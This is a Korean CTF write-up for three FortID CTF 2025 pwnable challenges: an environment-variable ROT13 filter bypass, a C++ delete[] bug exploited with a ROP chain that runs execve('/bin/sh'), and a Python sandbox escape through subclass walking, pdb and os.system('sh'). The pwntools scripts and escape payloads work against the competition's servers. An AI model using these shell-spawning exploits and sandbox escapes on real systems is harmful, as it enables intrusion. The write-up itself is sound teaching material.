---
title: FortID CTF 2025 Pwnable Writeup
published: 2025-09-21 13:40:00 +09:00
description: "Pwnable Writeup"
tags: ["CTF", "Pwnable", "Writeup"]
image: ./title.png

category: CTF
draft: false
---

# Intro

ㅎㅇ 포너블 라이트업 입ㄴ다ㅣ.

# Protect the Environment

<p align="center"><img src="/assets/img/FortID-CTF-2025/chall1_title.png"></p>

`chall.c`와 `libc` 정보등이 주어집니다. 제공되는 파일에 따르면 서버에서 사용되는 `libc`는 `2.27`이겠군요.

## Static Analysis

문제 코드를 보면 다음과 같습니다.

```c
// gcc -o chall chall.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void rot13(char *s) {
  while (*s != 0) {
    *s += 13;
    s++;
  }
}

int main(void) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  char command[64];
  char name[64];

  while (1) {
    printf("> ");
    scanf("%63s %63s", command, name);
    if (!strcmp(command, "protect")) {
      char *val = getenv(name);
      if (val) {
        rot13(val);
        printf("Protected %s\n", name);
      } else {
        printf("No such environment variable\n");
      }
    } else if (!strcmp(command, "print")) {
      if (!strcmp(name, "FLAG")) {
        printf("Access denied\n");
      } else {
        char *val = getenv(name);
        if (val) {
          printf("%s=%s\n", name, val);
        } else {
          printf("No such environment variable\n");
        }
      }
    } else {
      printf("Unknown command\n");
      break ;
    }
  } 
  return 0;
}
```
`print`와 `protect` 커맨드가 제공되고 있으며, 이에 대한 타겟은 바이너리가 실행될 때 갖게되는 환경 변수가 됩니다.

`protect` 커맨드를 환경 변수에 적용시키면 환경 변수에 입력된 값에 대해서 `ROT13` 연산을 진행하게됩니다.

또한 `print` 커맨드에서 볼 수 있듯, `FLAG` 환경 변수가 설정되어있는 듯 하고, 이를 읽는 문제라고 볼 수 있겠습니다.

그대로 `print` 연산의 인자로 지정할 경우 필터링에 걸리기 때문에 `FLAG`를 평문으로 보는 방법은 없습니다. 딱히 공격할 구간이 있지도 않았습니다.

해당 문제에서는 환경변수에 가공을 가할 경우 발생하는 논리적 문제를 이용해서 플래그를 얻어낼 수 있습니다. 현재 플래그의 생김새를 대충 생각해보면 환경 변수는 다음과 같이 스택에 설정 되어있을겁니다.

`FLAG=?????????` 

이때 `=` 이후의 구간에 `ROT13` 연산을 진행했을 때 다음과 같이 나오게된다면,

`FLAG==????????`

환경변수 이름을 `FLAG=`로 조회하여 필터링을 우회하고 `ROT13`이 `N`번 걸려있는 상태의 플래그 값을 볼 수 있습니다. 해당 문제를 풀 당시에는 느낌적으로 "그렇게 하면 되지 않을까?"로 접근했었는데, 운 좋게 맞아떨어졌습니다. `glibc-2.27`에서의 `getenv` 코드는 <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/getenv.c">여기</a>에서 확인할 수 있습니다.

## Exploit

먼저 다음과 같은 코드로 `FLAG==`의 형태로 값을 만들기 위해 필요한 `N`값 + `ROT13`이 `N`번 적용된 플래그 값을 추출해냅니다.
```python
from pwn import *
p = remote('0.cloud.chals.io', 33121)
i = 1
while True:
    p.sendlineafter('>', 'protect FLAG')
    p.sendlineafter('>', 'print FLAG=')
    result = p.recvuntil('No such environment variable\n', timeout=3)
    if b"" == result:
        break
    i+=1
print(i)
p.interactive()
```

다음으로는 이렇게 구한 `N`과 인코딩된 플래그 값을 가지고 원본 플래그를 복원하면 됩니다.

```python
a = "=fik@;r?+i;VkFVgifK*:KVk_*V*em(iFed*EKVn(k?VC(YZVD(,ki*+k(e^V(kt"
cnt = 19
for i in a:
    print(chr((ord(i)-13*cnt)&0xff), end="")
```

<p align="center"><img src="/assets/img/FortID-CTF-2025/chall1_flag.png"></p>

# Déjà vu

C++ 문제입니다.

<p align="center"><img src="/assets/img/FortID-CTF-2025/chall2_title.png"></p>

소스 코드와 문제 파일이 주어집니다. 

## Analysis (Static, Dynamic)

소스 코드를 보면 다음과 같습니다.

```cpp
// g++ -o chall chall.cpp --static

#include <functional>
#include <iostream>
#include <string>

using namespace std;

// Decorator factory: returns a function that adds a prefix
auto make_prefix_decorator(const char* prefix) {
    return new function<void(const char*)>([prefix](const char *input) {
        puts(prefix);
        puts(input);
    });
}

int main() {
    cout.setf(ios::unitbuf);
    // Get the name from user
    cout << "Enter your name: ";
    string name;
    getline(cin, name);
    // Create a decorator that prints with "Hello, " prefix
    auto decorator = make_prefix_decorator("Hello, ");
    // Use the decorator
    (*decorator)(name.c_str());
    // Clean up
    delete[] decorator; 
    return 0;
}
```

데코레이터를 만들고 사용하는 코드입니다. 이때 생성된 데코레이터를 해제하는 과정에서 문제가 발생합니다. 단일 객체임에도 불구하고 배열 형태의 해제 문법을 사용하고 있습니다. `IDA`로 열어보면 이로인해 해제되는 타겟을 객체 배열로 인식하여 각각의 소멸자를 호출하려함을 알 수 있습니다.

<p align="center"><img src="/assets/img/FortID-CTF-2025/chall2_ida1.png"></p>

최종적으로 `_Function_base`에 대한 소멸자가 다음과 같이 호출됩니다.

<p align="center"><img src="/assets/img/FortID-CTF-2025/chall2_ida2.png"></p>

또한 호출 시점에 레지스터들이 다음과 같이 설정되어있다는 사실을 알 수 있습니다.

<p align="center"><img src="/assets/img/FortID-CTF-2025/chall2_gdb.png"></p>

이를 활용해서 공격을 수행해봅시다.

## Exploit

보호 기법은 다음과 같이 무난합니다. PIE가 적용되어있지 않아서 따로 릭 과정은 거치지 않아도 되겠네요. `static` 바이너리니 라이브러리도 필요없습니다.

<p align="center"><img src="/assets/img/FortID-CTF-2025/chall2_mitigation.png"></p>

소멸자에 해당하는 구간에 사용자 입력을 넣을 수 있으며, 전달되는 첫 번째 인자 역시 임의로 조작하는 것이 가능합니다.

주어진 힙 영역에 다음과 페이로드를 다음과 같이 삽입해줍시다.

<p align="center"><img src="/assets/img/FortID-CTF-2025/chall2_payload.png"></p>

공격 흐름은 다음과 같습니다.

- 현재 `RCX`가 담고 있는 힙 주소로 `RSP` 피봇, 이후 `ROP` 체이닝 가능
- `read`로 `/bin/sh`를 적당한 위치에 삽입
- `execve("/bin/sh", NULL, NULL);`

최종 공격 코드는 다음과 같습니다.

```python
from pwn import *

p = remote('0.cloud.chals.io', 26620)

POP_RAX = p64(0x4006df)
POP_RDI = p64(0x400b16)
POP_RDX = p64(0x423032)
POP_RBX = p64(0x482082)

POP_RSI = p64(0x4036de)
SH = p64(0x57fd0c)
SH_BUFF = p64(0x7bd000)
SYSCALL = p64(0x514a87)

payload = b'A'*(512)
payload += p64(0x401841)
payload += p64(0x0) # dummy
payload += p64(0x49a26e)

# read
payload += POP_RAX
payload += p64(0x0)
payload += POP_RDI
payload += p64(0x0)
payload += POP_RSI
payload += SH_BUFF
payload += POP_RDX
payload += p64(0x100)
payload += SYSCALL

payload += POP_RAX
payload += p64(0x3b)
payload += POP_RDI
payload += SH_BUFF
payload += POP_RSI
payload += p64(0x0)
payload += POP_RDX
payload += p64(0x0)
payload += SYSCALL

p.sendlineafter(':',payload)
p.send('/bin/sh\x00')

p.interactive()
```


# Michael Scofield

<p align="center"><img src="/assets/img/FortID-CTF-2025/chall3_title.png"></p>

`pyjail` 문제입니다.(이게 왜 포너블?) 다음과 같은 코드가 주어집니다.

```python
def check_pattern(user_input):
    """
    This function will check if numbers or strings are in user_input.
    """
    return '"' in user_input or '\'' in user_input or any(str(n) in user_input for n in range(10))


while True:
    user_input = input(">> ")

    if len(user_input) == 0:
        continue

    if len(user_input) > 500:
        print("Too long!")
        continue

    if not __import__("re").fullmatch(r'([^()]|\(\))*', user_input):
        print("No function calls with arguments!")
        continue

    if check_pattern(user_input):
        print("Numbers and strings are forbbiden")
        continue

    forbidden_keywords = ['eval', 'exec', 'import', 'open']
    forbbiden = False
    for word in forbidden_keywords:
        if word in user_input:
            forbbiden = True

    if forbbiden:
        print("Forbbiden keyword")
        continue

    try:
        output = eval(user_input, {"__builtins__": None}, {})
        print(output)
    except:
        print("Error")
```

## Exploit

다음과 같은 순서로 탈옥이 가능합니다.

```python
().__class__.__base__.__subclasses__()[[True+True+True+True+True+True+True+True+True+True+True+True].pop()**[True+True].pop()+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True]()()
```

pdb → sandbox

```python
[ y for y in [ x for x in ().__class__.__base__.__subclasses__()[[True+True].pop()**[True+True+True+True+True+True+True].pop()+True+True+True+True+True+True+True+True+True+True+True+True+True].__init__.__globals__.values()] [[True+True].pop()**[True+True+True].pop()].modules.values()][True-True-True-True].set_trace()
``` 

이후 pdb 쉘에서 필터링 없이 자유롭게 공격 가능

```python
"".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["__import__"]("os").system("sh")
```

숫자를 쓰지 못하니 `True+True=2`와 같이 나온다는 점에 착안하여 `제곱수 + 나머지`의 형식으로 값을 산출한뒤 인덱스에 맞는 값으로 나머지 `+` 연산을 진행했습니다.

이후 노가다를 통해 인덱스를 죄다 구한 다음에 `pdb`로 접속해서 쉘 커맨드를 실행하면 탈옥이 가능합니다.

`FortID{Wh3n_7h3_517u4710n_l00k5_1mp0551bl3,_y0u_d0n7_g1v3_up}`

끝!